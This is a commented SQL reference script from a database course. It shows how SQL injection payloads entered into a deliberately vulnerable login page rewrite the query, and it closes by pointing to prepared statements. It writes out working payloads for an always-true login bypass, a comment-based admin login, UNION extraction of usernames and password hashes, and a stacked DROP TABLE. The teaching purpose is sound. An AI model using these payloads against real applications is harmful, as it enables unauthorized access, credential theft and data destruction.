-- DBAS 1020 - Week 7: SQL Injection payloads, explained.
--
-- This file is a READING / REFERENCE script, not something you run as-is.
-- The attack happens in the browser on www/week7_login.php. This file shows
-- what each payload does to the query the page builds, so you can see the
-- data-vs-code problem in plain SQL.
--
-- Setup the login runs against (see initdb/02_users.sql):
USE appdb;
-- SELECT id, username, role FROM users ORDER BY id;   -- 6 rows, admin first

-- ===================================================================
-- The template the page builds for every login:
--
--   SELECT username, password FROM users
--   WHERE username = '<USER>' AND password = '<PASS>'
--
-- <USER> and <PASS> are your text, glued straight in. Change them and
-- you change the query itself - that is the whole vulnerability.
-- ===================================================================


-- -------------------------------------------------------------------
-- 0. Normal, honest login (what the app expects)
--    USER = admin      PASS = whatever
-- -------------------------------------------------------------------
SELECT username, password FROM users
WHERE username = 'admin' AND password = 'whatever';
-- -> 0 rows. 'whatever' never equals the stored SHA-256 hash. "Login failed."


-- -------------------------------------------------------------------
-- 1. Authentication bypass - the classic always-true payload
--    USER = ' OR '1'='1
--    PASS = (anything)
-- -------------------------------------------------------------------
SELECT username, password FROM users
WHERE username = '' OR '1'='1' AND password = 'x';
-- -> '1'='1' is always true, so the WHERE matches. The first row comes
--    back and the page logs you in. You never knew a password.


-- -------------------------------------------------------------------
-- 2. Log in as a SPECIFIC user with a comment marker
--    USER = admin' --            (note the space after --)
--    PASS = (anything)
-- -------------------------------------------------------------------
SELECT username, password FROM users
WHERE username = 'admin' -- ' AND password = 'x';
-- -> Everything after --  is a comment, so the password check is gone.
--    The query is just: username = 'admin'. You are now the admin.
--    (In MySQL you can also use #  to start the comment.)


-- -------------------------------------------------------------------
-- 3. Data exfiltration - UNION pulls rows out of the table
--    USER = ' UNION SELECT username, password FROM users --
--    PASS = (anything)
-- -------------------------------------------------------------------
SELECT username, password FROM users
WHERE username = ''
UNION SELECT username, password FROM users -- ' AND password = 'x';
-- -> The first half matches nothing; the UNION bolts on every row of
--    users. The page now renders every username and password hash.
--    UNION needs the SAME NUMBER OF COLUMNS - here, two - which is why
--    this login was written to select exactly two.


-- -------------------------------------------------------------------
-- 4. Destruction - stacked statements (why the lecture calls it a "mercy")
--    USER = '; DROP TABLE users; --
-- -------------------------------------------------------------------
-- '; DROP TABLE users; --
-- -> MySQL's default PHP driver (mysqli::query) runs ONE statement per
--    call, so this particular attack fails on our page. That is NOT
--    protection - bypass (1,2) and exfiltration (3) still work. Other
--    drivers and multi_query() would run the DROP.


-- ===================================================================
-- The root cause, in one line:
--   the database cannot tell your DATA ('admin') from your CODE (OR '1'='1').
-- Next week we fix it with prepared statements, which send the two apart.
-- ===================================================================
